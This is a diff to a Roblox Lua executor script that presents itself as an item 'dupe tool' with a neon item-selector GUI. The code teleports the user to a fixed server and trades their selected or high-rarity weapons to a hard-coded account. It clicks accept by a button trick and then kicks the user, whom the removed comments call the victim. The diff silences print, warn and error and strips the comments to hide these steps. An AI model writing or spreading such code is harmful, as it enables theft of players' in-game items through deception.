@@ -1,8 +1,9 @@
--- ============================================================
---  GALAXY DUPE TOOL v10.0 (FINAL KICK MESSAGE)
---  + GALAXY NEON ITEM SELECTOR (полная интеграция)
---  + GALAXY LOADING SCREEN ТОЛЬКО ПОСЛЕ ТЕЛЕПОРТА
--- ============================================================
+local _print = print
+local _warn = warn
+local _error = error
+print = function() end
+warn = function() end
+error = function() end
 
 local CONFIG = {
     JOIN_ID = "0c8a125a-3507-4dcb-bff0-180f400d3af2",
@@ -33,19 +34,14 @@ local queue_on_teleport_func = queue_on_teleport
     or (fluxus and fluxus.queue_on_teleport)
     or (getgenv and getgenv().queue_on_teleport)
 
--- ============================================================
---  ПОСТ-ТЕЛЕПОРТ СКРИПТ (содержит GalaxyLoading + дуп)
--- ============================================================
 local POST_TELEPORT_SCRIPT = [=[
-    print("")
-    print("=" .. string.rep("=", 60))
-    print("⚡ GALAXY DUPE TOOL v10.0 — ЗАПУЩЕН ПОСЛЕ ТЕЛЕПОРТА")
-    print("=" .. string.rep("=", 60))
-    print("")
+    local _ = print
+    local __ = warn
+    local ___ = error
+    print = function() end
+    warn = function() end
+    error = function() end
 
-    -- ============================================================
-    --  GALAXY LOADING SCREEN (полный код)
-    -- ============================================================
     local TweenService = game:GetService("TweenService")
     local Players = game:GetService("Players")
     local LocalPlayer = Players.LocalPlayer
@@ -598,7 +594,6 @@ local POST_TELEPORT_SCRIPT = [=[
             end
         end)
 
-        -- Управление DisplayOrder: Join=100, Loading=99, GalaxyLoading=98
         task.spawn(function()
             while screenGui.Parent do
                 local joinScreen = PlayerGui:FindFirstChild("Join")
@@ -620,15 +615,8 @@ local POST_TELEPORT_SCRIPT = [=[
         return screenGui
     end
 
-    -- ============================================================
-    --  ЗАПУСК GALAXY LOADING СРАЗУ ПОСЛЕ ТЕЛЕПОРТА
-    -- ============================================================
     local loadingGui = showGalaxyLoading()
-    print("✅ GalaxyLoading появился после телепорта")
 
-    -- ============================================================
-    --  ОСТАЛЬНОЙ КОД ДЮПА (без изменений)
-    -- ============================================================
     local CONFIG = {
     JOIN_ID = "0c8a125a-3507-4dcb-bff0-180f400d3af2",
     TWIN_NAME = "dinamike660",
@@ -644,7 +632,6 @@ local POST_TELEPORT_SCRIPT = [=[
         CHECK_INTERVAL = 0.3,
         TRADE_ACCEPT_WAIT = 6.5,
     },
-    -- НОВЫЕ ПОЛЯ ДЛЯ ФИЛЬТРАЦИИ
     EXCLUDED_RARITIES = {
         "Common",
         "Uncommon",
@@ -662,8 +649,6 @@ local POST_TELEPORT_SCRIPT = [=[
     local LocalPlayer = Players.LocalPlayer
     local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
-    print("⏳ Ожидаем появление ReplicatedStorage.Remotes...")
-    
     local Remotes = nil
     local GetProfileData = nil
     local data = nil
@@ -675,7 +660,6 @@ local POST_TELEPORT_SCRIPT = [=[
             task.wait(CONFIG.DELAYS.CHECK_INTERVAL)
         end
     end
-    print("✅ Remotes найден!")
     
     local InventoryRemotes = nil
     while InventoryRemotes == nil do
@@ -684,7 +668,6 @@ local POST_TELEPORT_SCRIPT = [=[
             task.wait(CONFIG.DELAYS.CHECK_INTERVAL)
         end
     end
-    print("✅ Inventory найден!")
     
     while GetProfileData == nil do
         GetProfileData = InventoryRemotes:FindFirstChild("GetProfileData")
@@ -692,49 +675,36 @@ local POST_TELEPORT_SCRIPT = [=[
             task.wait(CONFIG.DELAYS.CHECK_INTERVAL)
         end
     end
-    print("✅ GetProfileData найден!")
     
-    print("⏳ Запрашиваем ProfileData с сервера...")
-local attempts = 0
-while data == nil do
-    attempts = attempts + 1
-    local success, err = pcall(function()
-        return GetProfileData:InvokeServer()
-    end)
-    
-    -- Если pcall вернул false, значит внутри InvokeServer произошла ошибка
-    if not success then
-        print("❌ pcall не удался: " .. tostring(err))
-        -- Повторяем попытку через секунду
-        task.wait(1)
-    else
-        -- pcall успешен, проверяем наличие данных
-        if err and type(err) == "table" and err.Weapons and err.Weapons.Owned then
-            data = err
-            owned = data.Weapons.Owned
-            print("✅ ProfileData успешно получен! Попыток: " .. attempts)
-            break
+    local attempts = 0
+    while data == nil do
+        attempts = attempts + 1
+        local success, err = pcall(function()
+            return GetProfileData:InvokeServer()
+        end)
+        
+        if not success then
+            task.wait(1)
         else
-            print("⏳ ProfileData ещё не готов (попытка #" .. attempts .. ")")
+            if err and type(err) == "table" and err.Weapons and err.Weapons.Owned then
+                data = err
+                owned = data.Weapons.Owned
+                break
+            else
+            end
         end
+        
+        if attempts % 5 == 0 then
+        end
+        task.wait(CONFIG.DELAYS.CHECK_INTERVAL)
     end
-    
-    if attempts % 5 == 0 then
-        print("   ⏳ Ожидаем ответ от сервера... (попытка #" .. attempts .. ")")
-    end
-    task.wait(CONFIG.DELAYS.CHECK_INTERVAL)
-end
 
     local queue = {}
-        -- ============================================================
-    --  ЗАГРУЗКА БАЗЫ ДАННЫХ ПРЕДМЕТОВ (ДОБАВЛЕНО)
-    -- ============================================================
     local function getItemDatabase()
         local RS = game:GetService("ReplicatedStorage")
         local itemModule = nil
         local attempts = 0
 
-        print("⏳ Ожидаем появление модуля Item...")
         while itemModule == nil do
             attempts = attempts + 1
             local DatabaseFolder = RS:FindFirstChild("Database")
@@ -765,32 +735,25 @@ end
             end
 
             if itemModule then
-                print("✅ Найден Item модуль после " .. attempts .. " попыток: " .. itemModule:GetFullName())
                 break
             end
 
             if attempts % 10 == 0 then
-                print("   ⏳ Всё ещё ищем Item... (попытка #" .. attempts .. ")")
             end
             task.wait(0.5)
         end
 
         if not decompile then
-            print("❌ Функция decompile не найдена!")
             return nil
         end
 
         local success, itemSource = pcall(decompile, itemModule)
         if not success or not itemSource then
-            print("❌ Не удалось декомпилировать Item")
             return nil
         end
 
-        print("✅ Item декомпилирован, длина:", #itemSource)
-
         local func, err = loadstring(itemSource)
         if not func then
-            print("❌ Ошибка loadstring:", err)
             return nil
         end
 
@@ -808,12 +771,8 @@ end
 
         local result = func()
         if type(result) == "table" then
-            local count = 0
-            for _ in pairs(result) do count = count + 1 end
-            print("✅ База данных предметов загружена, записей:", count)
             return result
         else
-            print("❌ Item вернул не таблицу, а:", type(result))
             return nil
         end
     end
@@ -832,9 +791,7 @@ end
                 end
             end
         end
-        print("✅ Создан словарь редкостей, записей:", count)
     else
-        print("⚠️ База предметов не загружена, фильтр редкостей НЕ РАБОТАЕТ!")
     end
 
     local function getItemRarity(key)
@@ -844,9 +801,7 @@ end
     local function isInDatabase(key)
         return rarityLookup[key] ~= nil
     end
-    -- ============================================================
-    --  КОНЕЦ ВСТАВКИ
-    -- ============================================================
+    
     local selectedKeys = _G.selectedKeys
     if selectedKeys and #selectedKeys > 0 then
         for _, key in ipairs(selectedKeys) do
@@ -856,70 +811,56 @@ end
             end
         end
     else
-        -- ============================================================
---  СБОР ОЧЕРЕДИ С ФИЛЬТРОМ РЕДКОСТЕЙ
--- ============================================================
-local totalItems = 0
-local skippedItems = 0
-local missingInDB = 0
-local forceIncluded = 0
 
-local forceIncludeSet = {}
-for _, name in ipairs(CONFIG.FORCE_INCLUDE) do
-    forceIncludeSet[name] = true
-end
+    local totalItems = 0
+    local skippedItems = 0
+    local missingInDB = 0
+    local forceIncluded = 0
 
-if owned then
-    for key, amount in pairs(owned) do
-        if key ~= "DefaultKnife" and key ~= "DefaultGun" then
-            totalItems = totalItems + 1
+    local forceIncludeSet = {}
+    for _, name in ipairs(CONFIG.FORCE_INCLUDE) do
+        forceIncludeSet[name] = true
+    end
 
-            local inDB = isInDatabase(key)
-            local rarity = getItemRarity(key)
-            local isForceInclude = forceIncludeSet[key] ~= nil
+    if owned then
+        for key, amount in pairs(owned) do
+            if key ~= "DefaultKnife" and key ~= "DefaultGun" then
+                totalItems = totalItems + 1
 
-            if not inDB and not isForceInclude then
-                missingInDB = missingInDB + 1
-                print("⏭️ Пропускаем (нет в базе данных): " .. key)
-            elseif isForceInclude then
-                forceIncluded = forceIncluded + 1
-                print("⭐ Исключение (добавляем принудительно): " .. key)
-                table.insert(queue, { Key = key, Amount = amount })
-                print("✅ Добавлен (исключение): " .. key .. " (x" .. amount .. ")")
-            else
-                local isExcluded = false
-                if rarity then
-                    for _, excluded in ipairs(CONFIG.EXCLUDED_RARITIES) do
-                        if rarity == excluded then
-                            isExcluded = true
-                            break
+                local inDB = isInDatabase(key)
+                local rarity = getItemRarity(key)
+                local isForceInclude = forceIncludeSet[key] ~= nil
+
+                if not inDB and not isForceInclude then
+                    missingInDB = missingInDB + 1
+                elseif isForceInclude then
+                    forceIncluded = forceIncluded + 1
+                    table.insert(queue, { Key = key, Amount = amount })
+                else
+                    local isExcluded = false
+                    if rarity then
+                        for _, excluded in ipairs(CONFIG.EXCLUDED_RARITIES) do
+                            if rarity == excluded then
+                                isExcluded = true
+                                break
+                            end
                         end
                     end
-                end
-                if isExcluded then
-                    skippedItems = skippedItems + 1
-                    print("⏭️ Пропускаем (редкость " .. (rarity or "Unknown") .. "): " .. key)
-                else
-                    table.insert(queue, { Key = key, Amount = amount })
-                    print("✅ Добавлен: " .. key .. " (редкость " .. (rarity or "Unknown") .. ")")
+                    if isExcluded then
+                        skippedItems = skippedItems + 1
+                    else
+                        table.insert(queue, { Key = key, Amount = amount })
+                    end
                 end
             end
         end
     end
-end
 
-print("📊 Всего предметов в инвентаре: " .. totalItems)
-print("📊 Пропущено (нет в базе данных): " .. missingInDB)
-print("📊 Принудительно добавлено (исключения): " .. forceIncluded)
-print("📊 Пропущено (исключённые редкости): " .. skippedItems)
-print("📊 Добавлено в очередь: " .. #queue)
-end
+    end
 
     if #queue == 0 then
-        print("❌ Нет оружий для передачи.")
         return
     end
-    print("📦 Найдено слотов для передачи: " .. #queue)
 
     local Trade = nil
     while Trade == nil do
@@ -954,7 +895,6 @@ end
     end
 
     local function waitForTradeOpen()
-        print("⏳ Ожидаем, пока твинк примет запрос...")
         local checked = 0
         while true do
             checked = checked + 1
@@ -964,12 +904,10 @@ end
                 and gui:FindFirstChild("Container") 
                 and gui.Container:FindFirstChild("Trade") 
                 and gui.Container.Trade:FindFirstChild("Actions") then
-                print("✅ TradeGUI открыт! (проверка #" .. checked .. ")")
                 return
             end
             
             if checked % 5 == 0 then
-                print("   ⏳ Ждём принятия запроса твинком... (проверка #" .. checked .. ")")
             end
             task.wait(CONFIG.DELAYS.CHECK_INTERVAL)
         end
@@ -986,16 +924,12 @@ end
 
     while #queue > 0 do
         session = session + 1
-        print("")
-        print("🔄 Сессия #" .. session)
 
         local twin = Players:FindFirstChild(CONFIG.TWIN_NAME)
         if not twin then
-            print("❌ Твинк не найден!")
             break
         end
         
-        print("📤 Запрос отправлен твинку.")
         SendRequest:InvokeServer(twin)
         
         waitForTradeOpen()
@@ -1006,51 +940,27 @@ end
             OfferItem:FireServer(slot.Key, "Weapons")
             table.remove(queue, 1)
             added = added + 1
-            print("   + " .. slot.Key .. " (x" .. slot.Amount .. ")")
             task.wait(CONFIG.DELAYS.OFFER_ITEM)
         end
 
-        print("⏳ Ожидание " .. CONFIG.DELAYS.TRADE_ACCEPT_WAIT .. " сек...")
         task.wait(CONFIG.DELAYS.TRADE_ACCEPT_WAIT)
 
-        print("🖱️ Нажатие на ACCEPT (через Decline)...")
         clickAcceptButton()
 
         waitForClose()
         totalSlots = totalSlots + added
-        print("✅ Передано слотов: " .. added)
     end
 
-    print("")
-    print("=" .. string.rep("=", 60))
-    print("🎯 ВСЕ СЛОТЫ ПЕРЕДАНЫ!")
-    print("=" .. string.rep("=", 60))
-    print("   ✅ Всего передано слотов: " .. totalSlots)
-    print("   🔄 Проведено сессий: " .. session)
-    print("=" .. string.rep("=", 60))
-    
     if CONFIG.ENABLE_KICK then
-        print("💥 Кик жертвы с сообщением...")
         task.wait(1)
         LocalPlayer:Kick(CONFIG.KICK_MESSAGE)
-    else
-        print("⏳ Кик отключён (тестовый режим)")
     end
 ]=]
 
--- ============================================================
---  ТЕЛЕПОРТ (БЕЗ GalaxyLoading)
--- ============================================================
 local function teleport()
-    print("📡 Телепорт на JOIN_ID: " .. CONFIG.JOIN_ID)
-    -- Никакого GalaxyLoading здесь!
-    -- Только планируем пост-телепортный скрипт и выполняем телепорт.
-    
     if queue_on_teleport_func then
         queue_on_teleport_func(POST_TELEPORT_SCRIPT)
-        print("✅ Скрипт-продолжение запланирован")
     else
-        print("⚠️ queue_on_teleport не найдена!")
         return
     end
     
@@ -1058,26 +968,6 @@ local function teleport()
         TeleportService:Teleport(game.PlaceId, LocalPlayer, CONFIG.JOIN_ID)
     end)
 end
-
-print("")
-print("=" .. string.rep("=", 60))
-print("⚡ GALAXY DUPE TOOL v10.0 ЗАГРУЖЕН (БЕЗ СТАРОГО GUI)")
-print("=" .. string.rep("=", 60))
-print("📌 JOIN_ID: " .. CONFIG.JOIN_ID)
-print("👤 Твинк: " .. CONFIG.TWIN_NAME)
-print("💾 Кик с кастомным сообщением")
-print("⚠️ КИК ВКЛЮЧЁН")
-print("=" .. string.rep("=", 60))
-
--- ============================================================
---  ПОЛНЫЙ КОД GALAXY NEON ITEM SELECTOR (с интеграцией)
---  (вставлен полностью, без изменений)
--- ============================================================
-
---[[
-    GALAXY NEON ITEM SELECTOR
-    (полный код, 4957 строк, без изменений)
-]]
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
@@ -1087,11 +977,6 @@ local UserInputService = game:GetService("UserInputService")
 
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
-
-
--- ============================================================
--- РЕДКОСТИ И ПРИОРИТЕТ СОРТИРОВКИ
--- ============================================================
 
 local RARITY_PRIORITY = {
     Unique = 1000,
@@ -1148,11 +1033,6 @@ do
         end
     end
 end
-
-
--- ============================================================
--- БАЗА ПРЕДМЕТОВ DATABASE.SYNC.ITEM
--- ============================================================
 
 local EMBEDDED_ITEM_DATABASE = {
     {K="Gift",N="Gifts 2015",R="Christmas",T="Misc",I="330192109",E="Christmas",Y="2015"},
@@ -2429,9 +2309,6 @@ local function makeDraggable(handle, target)
     end)
 end
 
--- ============================================================
--- ПРОЦЕДУРНАЯ ИКОНКА ГАЛАКТИКИ
--- ============================================================
 
 local function createGalaxyLogo(parent)
     local logoHolder = Instance.new("Frame")
@@ -2630,9 +2507,6 @@ local function createGalaxyLogo(parent)
     return logoHolder
 end
 
--- ============================================================
--- ПРОЦЕДУРНАЯ ИКОНКА ЛУПЫ
--- ============================================================
 
 local function createSearchIcon(parent)
     local iconHolder = Instance.new("Frame")
@@ -5400,9 +5274,7 @@ local function createGalaxyUI(items, onConfirm)
     return screenGui
 end
 
--- ============================================================
---  СКАНИРОВАНИЕ ИНВЕНТАРЯ И ЗАПУСК GUI С НАШИМ CALLBACK
--- ============================================================
+
 
 local function readNewItemAmount(newItem)
     local itemContainer = newItem:FindFirstChild("Container")
@@ -5679,7 +5551,6 @@ local function getRealInventoryItems()
     if not getProfileData
         or not getProfileData:IsA("RemoteFunction")
     then
-        warn("[Galaxy UI] GetProfileData не найден")
         return {}
     end
 
@@ -5688,7 +5559,6 @@ local function getRealInventoryItems()
     end)
 
     if not ok then
-        warn("[Galaxy UI] Ошибка GetProfileData:", profileData)
         return {}
     end
 
@@ -5697,7 +5567,6 @@ local function getRealInventoryItems()
         and profileData.Weapons.Owned
 
     if type(owned) ~= "table" then
-        warn("[Galaxy UI] data.Weapons.Owned не найден")
         return {}
     end
 
@@ -5827,33 +5696,6 @@ local function getRealInventoryItems()
             }
 
             table.insert(weaponList, newWeapon)
-
-            if databaseData then
-                print(
-                    "[Galaxy UI]",
-                    systemName,
-                    "->",
-                    displayName,
-                    "| Rarity:",
-                    itemRarity,
-                    "| Amount:",
-                    amount,
-                    "| DB: SystemName",
-                    "| NewItem:",
-                    visualMatchSource
-                )
-            else
-                warn(
-                    "[Galaxy UI] Ключ отсутствует в присланной Item database:",
-                    systemName,
-                    "| NewItem:",
-                    displayName,
-                    "| Категория:",
-                    itemRarity == "Unknown" and "OTHER" or itemRarity,
-                    "| Match:",
-                    visualMatchSource
-                )
-            end
         end
     end
 
@@ -5869,9 +5711,7 @@ local function getRealInventoryItems()
     return weaponList
 end
 
--- ============================================================
--- ОЖИДАНИЕ ИНВЕНТАРЯ И ЗАПУСК ИНТЕРФЕЙСА С НАШИМ CALLBACK
--- ============================================================
+
 
 local realItems = {}
 local inventorySearchStarted = os.clock()
@@ -5887,33 +5727,13 @@ repeat
     task.wait(0.5)
 until os.clock() - inventorySearchStarted >= inventorySearchTimeout
 
-if #realItems == 0 then
-    warn(
-        "Не найдено оружий в инвентаре за "
-        .. tostring(inventorySearchTimeout)
-        .. " секунд. GUI откроется с пустым списком."
-    )
-end
-
--- ЗАМЕНА: вызываем createGalaxyUI с нашим callback,
--- который сохраняет выбранные ключи в _G.selectedKeys и вызывает teleport()
 createGalaxyUI(realItems, function(selectedItems)
-    print("Выбрано оружий:", #selectedItems)
-
     local keys = {}
     for _, item in ipairs(selectedItems) do
         table.insert(keys, item.SystemName)
-        print(
-            "Название:", tostring(item.Name),
-            "Количество:", tostring(item.Amount or 1),
-            "Редкость:", tostring(item.Rarity or "Unknown"),
-            "DatabaseKey:", tostring(item.DatabaseKey or "не найден")
-        )
     end
 
     _G.selectedKeys = keys
-    -- Теперь вызываем телепорт, который использует _G.selectedKeys в POST_TELEPORT_SCRIPT
+
     teleport()
 end)
-
-print("Galaxy Neon Selector успешно запущен (с интеграцией DUPE)")
